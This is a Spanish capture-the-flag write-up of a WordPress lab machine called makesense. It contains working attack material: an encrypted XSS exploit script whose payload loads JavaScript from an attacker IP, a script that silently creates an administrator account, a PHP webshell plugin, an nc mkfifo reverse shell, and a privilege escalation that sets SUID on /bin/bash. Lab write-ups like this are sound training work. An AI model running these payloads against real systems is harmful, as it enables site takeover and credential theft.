---
layout: apunte
title: "1. Getting the Flags"
---

<h2>Reconocimiento Inicial</h2>
Comenzamos realizando un escaneo de puertos abiertos.

!**Pasted image 20260709124917.png**

Ahora escaneamos dichos puertos un poco más en profundidad.

!**Pasted image 20260709124944.png**

Vamos a ver qué encontramos en el puerto 443.

!**Pasted image 20260709130238.png**
!**Pasted image 20260709130319.png**

De aquí podemos sacar en claro un par de cosas. Estamos ante un WordPress y hay un directorio que no soporta el método GET, `/xmlrpc.php`. Probaremos con POST más adelante.

Vamos ahora a ver cómo se ve la página web.

!**Pasted image 20260709130450.png**

Lo único medianamente interesante por aquí es el formulario de contacto. Tanto dicho formulario como el botón del teléfono, el cual nos permite grabar un mensaje de voz que se autoprocesa:

!**Pasted image 20260709130522.png**

--------------------------------------
<h2>Profundización</h2>
Aprovechando que sabemos que estamos en WordPress, vamos a realizar un escaneo con WPScan:

```bash
wpscan --url https://makesense.htb --disable-tls-checks --api-token [REDACTED] -e u
```

```txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://makesense.htb/ [10.129.64.167]
[+] Started: Thu Jul  9 13:09:04 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://makesense.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://makesense.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: https://makesense.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://makesense.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 7.0 identified (Latest, released on 2026-05-20).
 | Found By: Meta Generator (Passive Detection)
 |  - https://makesense.htb/, Match: 'WordPress 7.0'
 | Confirmed By: Atom Generator (Aggressive Detection)
 |  - https://makesense.htb/?feed=atom, <generator uri="https://wordpress.org/" version="7.0">WordPress</generator>

[+] WordPress theme in use: webagency
 | Location: https://makesense.htb/wp-content/themes/webagency/
 | Style URL: https://makesense.htb/wp-content/themes/webagency/style.css?ver=7.0
 | Style Name: WebAgency
 | Style URI: https://example.com
 | Description: Modern web development agency theme with Tailwind CSS...
 | Author: WebAgency Team
 | Author URI: https://example.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://makesense.htb/wp-content/themes/webagency/style.css?ver=7.0, Match: 'Version: 1.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <======================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] walter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] jake
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 21

[+] Finished: Thu Jul  9 13:09:13 2026
[+] Requests Done: 65
[+] Cached Requests: 10
[+] Data Sent: 16.457 KB
[+] Data Received: 568.891 KB
[+] Memory used: 173.559 MB
[+] Elapsed time: 00:00:08
```

De aquí sacamos los usuarios:

- `walter`
- `admin`
- `jake`

Ahora vamos a mirar en los directorios que hemos encontrado.

Si miramos en `/uploads`, podemos encontrarnos con un audio que hemos grabado nosotros mismos en el botón de teléfono.

!**Pasted image 20260709133006.png**

Mirando el resto, no parecemos encontrar nada a parte de algunos documentos de WP, por lo que miramos el código fuente, yendo directamente a la sección de contacto (que era la más interesante).

!**Pasted image 20260709133658.png**

Una vez allí resaltan estos dos scripts, por ser el funcionamiento de la IA que gestiona los audios, aparentemente.

Leyendo el `whisper-wrapper.js` podemos encontrar una `ENCRYPTION_KEY` hardcodeada.

!**Pasted image 20260709133834.png**

También vemos el mapeado de símbolos (habla de XSS, raro, así que vamos a tirar por ahí).

!**Pasted image 20260709133931.png**

Además, podemos ver cómo se encripta el payload.

!**Pasted image 20260709134248.png**

Si ahora miramos el `main.js`, podemos encontrar la forma en la que se envía el payload.

!**Pasted image 20260709134645.png**

Y

!**Pasted image 20260709134720.png**

--------------------------------------
<h2>Explotación</h2>
<h3>XSS</h3>
Con toda esta información, podemos crear un script que nos ayude a encriptar un payload y mandarlo al backend para probar XSS. 

```python
#!/usr/bin/env python3
import os
import re
import json
import base64
import hashlib
import requests
import urllib3
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://makesense.htb"
KEY = "[REDACTED]"

ATTACKER_IP = "[REDACTED]"
ATTACKER_PORT = 8000

xss = f"""<img src=x onerror="var s=document.createElement('script');s.src='http://{ATTACKER_IP}:{ATTACKER_PORT}/p.js';document.body.appendChild(s)">"""

s = requests.Session()
s.verify = False

# 1. Sacar nonce público
r = s.get(BASE + "/")
m = re.search(r'"nonce":"([^"]+)"', r.text)
if not m:
    print("[-] No encuentro nonce")
    exit(1)

nonce = m.group(1)
print("[+] Nonce:", nonce)

# 2. Enviar formulario de contacto para obtener post_id
data = {
    "action": "submit_contact_form",
    "nonce": nonce,
    "name": "test",
    "email": "test@test.htb",
    "phone": "123456789",
    "message": "This is a long enough message to trigger processing"
}

r = s.post(BASE + "/wp-admin/admin-ajax.php", data=data)
print("[+] Contact response:", r.text)

j = r.json()
post_id = j["data"]["post_id"]
print("[+] post_id:", post_id)

# 3. Cifrar payload igual que el JS
payload = {
    "transcription": xss,
    "summary": "test"
}

plaintext = json.dumps(payload, separators=(",", ":")).encode()

key = hashlib.sha256(KEY.encode()).digest()
iv = os.urandom(12)

aesgcm = AESGCM(key)
ciphertext = aesgcm.encrypt(iv, plaintext, None)

encrypted_payload = base64.b64encode(iv + ciphertext).decode()
print("[+] encrypted_payload:", encrypted_payload)

# 4. Enviar resultado cifrado
files = {
    "action": (None, "save_voice_results"),
    "nonce": (None, nonce),
    "post_id": (None, str(post_id)),
    "encrypted_payload": (None, encrypted_payload),
}

r = s.post(BASE + "/wp-admin/admin-ajax.php", files=files)
print("[+] Save response:", r.text)
```

Ahora creamos el script que creará el usuario administrador con contraseña conocida, `p.js`:

```javascript
fetch('/wp-admin/user-new.php', {
  credentials: 'include'
})
.then(r => r.text())
.then(t => {
  const d = new DOMParser().parseFromString(t, 'text/html');
  const nonce = d.querySelector('input[name="_wpnonce_create-user"]').value;

  const body = new URLSearchParams();
  body.append('action', 'createuser');
  body.append('_wpnonce_create-user', nonce);
  body.append('_wp_http_referer', '/wp-admin/user-new.php');
  body.append('user_login', 'owned');
  body.append('email', 'owned@owned.htb');
  body.append('first_name', '');
  body.append('last_name', '');
  body.append('url', '');
  body.append('pass1', 'Password123!');
  body.append('pass2', 'Password123!');
  body.append('role', 'administrator');
  body.append('createuser', 'Add New User');

  return fetch('/wp-admin/user-new.php', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: body.toString()
  });
})
.then(() => {
  fetch('http://[REDACTED]:8000/admin-created');
})
.catch(e => {
  fetch('http://[REDACTED]:8000/error?' + encodeURIComponent(e.toString()));
});
```

Levantamos un servidor en el mismo sitio que tengamos guardado `p.js` y ejecutamos el exploit. 

!**Pasted image 20260709141443.png**

Si todo sale bien deberíamos ver:

!**Pasted image 20260709141503.png**

Esto es debido a que hay un bot "admin" que revisa las transcripciones. Esto quiere decir que el usuario ha sido creado.
<h3>Plugin Malicioso -> Shell no Interactiva</h3>
Si ahora vamos a `wp-login.php`, podemos iniciar sesión con el nuevo usuario.

!**Pasted image 20260709141636.png**

Para poder obtener una shell, vamos a subir un plugin malicioso.

```php
<?php
/*
Plugin Name: MakeSense Shell
Description: Temporary diagnostic plugin.
Version: 1.0
Author: WebAgency
*/

if (!defined('ABSPATH')) {
    exit;
}

add_action('init', function () {
    if (!isset($_GET['ms_key']) || $_GET['ms_key'] !== 'edu123') {
        return;
    }

    if (!isset($_GET['ms_cmd'])) {
        echo "OK";
        exit;
    }

    header('Content-Type: text/plain');

    $cmd = $_GET['ms_cmd'];
    system($cmd);
    exit;
});
```

Con este plugin, lo que hacemos es obtener una webshell efectiva, con la que después podemos obtener una reverse shell. Para subirlo, comprimimos el directorio donde lo tenemos aislado:

```txt
makesense-shell
└── makesense-shell.php
```

Con:

```bash
zip -r makesense-shell.zip makesense-shell/
```

Y lo subimos y activamos.

!**Pasted image 20260709142014.png**

!**Pasted image 20260709142033.png**

Una vez hecho esto aparece en los plugins:

!**Pasted image 20260709142119.png**

Ahora sólo tenemos que mandar peticiones:

!**Pasted image 20260709142207.png**

<h3>Shell no Interactiva -> Reverse Shell</h3>
Vamos a obtener una reverse shell. A mi me gusta mucho usar `nc mkfifo`, es la que mejores resultados me da siempre, la obtenemos en [RevShells](https://www.revshells.com/) (la URL-encodeamos).

```txt
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20[REDACTED]%204444%20%3E%2Ftmp%2Ff
```

Nos ponemos en escucha, mandamos la petición con el comando y al recibir la shell la estabilizamos:

!**Pasted image 20260709142802.png**

Una vez aquí vamos a leer el archivo `wp-config.php`, que es donde se almacenan las credenciales necesarias para que WordPress se ejecute correctamente:

!**Pasted image 20260709142942.png**

Con estas credenciales iniciamos sesión por SSH y leemos la flag de usuario.

!**Pasted image 20260709143248.png**

-----------------------------------------
<h2>Escalada de Privilegios</h2>
Ahora toca ver qué se puede hacer. Después de seguir nuestra checklist, no hemos encontrado nada. Pero si recordamos bien, había un puerto que no podíamos utilizar, el 8001. Vamos a ver qué hay corriendo en dicho puerto.

!**Pasted image 20260709143413.png**

Parece que hay un proceso de `root` corriendo en dicho puerto. Esto puede servirnos para escalar. Vamos a realizar un port forwarding para intentar verlo en web.

```bash
ssh -L 8001:127.0.0.1:8001 walter@makesense.htb
```

Una vez hecho esto vamos en el navegador a `http://127.0.0.1:8001` e introducimos las credenciales de `walter`.

!**Pasted image 20260709143644.png**

Nos encontramos con esto. Vamos a ver si podemos dibujar algo.

!**Pasted image 20260709143751.png**

Parece que casi lo reconoce perfecto. Vamos a mirar el JS de la página.

!**Pasted image 20260709143943.png**

Podemos ver dos funciones interesantes que nos pueden ayudar a "dibujar" en JS.

Primero lo intentamos con el payload: `<?php system($_GET[0]);?>`. Pero la barra baja le costaba muchísimo de pillar, por lo que rápidamente cambié de estrategia. Si no puedo subir un parámetro que contenga un comando, igual puedo hardcodear el comando en el PHP para cambiar `/bin/bash` a permisos SUID.

```javascript
clearCanvas();
ctx.font = "bold 26px Arial";
ctx.fillStyle = "#000";
ctx.fillText('<?php chmod("/bin/bash" , 04755);', 10, 115);
sendCanvas();
```

!**Pasted image 20260709144305.png**

Ahora lo que hacemos es guardarla con el nombre que queramos.

!**Pasted image 20260709144347.png**

Por último visitamos la página en la que se ha guardado.

!**Pasted image 20260709144430.png**

Aparentemente no hay nada, pero si listamos ahora `/bin/bash`, vemos que tiene SUID.

!**Pasted image 20260709144504.png**

Vamos a ejecutar por último `/bin/bash -p`:

!**Pasted image 20260709144617.png**

Y leemos la flag:

!**Pasted image 20260709144645.png**

-----------------------------------------------
<h2>Conclusión</h2>
Una máquina ciertamente complicada, con bastante trabajo de por medio. Hemos trabajado:

- Enumeración de activos.
- Estudio de código JS.
- XSS.
- Desarrollo de exploits en Python.
- WordPress.
- Comprensión y enumeración de procesos.
- Explotación de OCR.

Una máquina muy completa y que me ha llevado mucho tiempo de sacar, pero valió la pena. ¡¡A por la próxima!!

>[!SUCCESS] Ambas flags obtenidas.

